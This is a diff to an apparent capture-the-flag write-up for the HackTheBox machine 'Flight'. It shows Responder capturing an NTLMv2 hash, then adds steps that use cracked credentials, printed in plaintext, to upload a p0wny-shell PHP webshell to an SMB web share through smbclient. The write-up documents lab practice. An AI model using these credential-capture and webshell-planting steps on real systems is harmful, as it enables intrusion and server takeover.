@@ -500,7 +500,7 @@ sudo responder -I tun0 -wPv
 
 Wait a little bit and you will see the NTLMv2 hash for C.Bum come across the network:
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (3).png" alt=""><figcaption></figcaption></figure>
 
 Time to crack this hash:
 
@@ -534,9 +534,22 @@ SMB         10.129.95.32    445    G0               Web             READ,WRITE
 ```
 
 * We see that we can now write to the Web share
+* Let's place a webshell in here
+
+{% embed url="https://github.com/flozz/p0wny-shell/blob/master/shell.php" %}
 
 ```
+smbclient '\\\\flight.htb\\Web' -I flight.htb -U C.Bum 'Tikkycoll_431012284'
+password: Tikkycoll_431012284
+
+smb: \> cd flight.htb\
+smb: \flight.htb\> put webshell.php 
+putting file webshell.php as \flight.htb\webshell.php (62.9 kb/s) (average 62.9 kb/s)
 ```
+
+* By navigating to /flight.htb/webshell.php, we can get to the webshell!
+
+<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
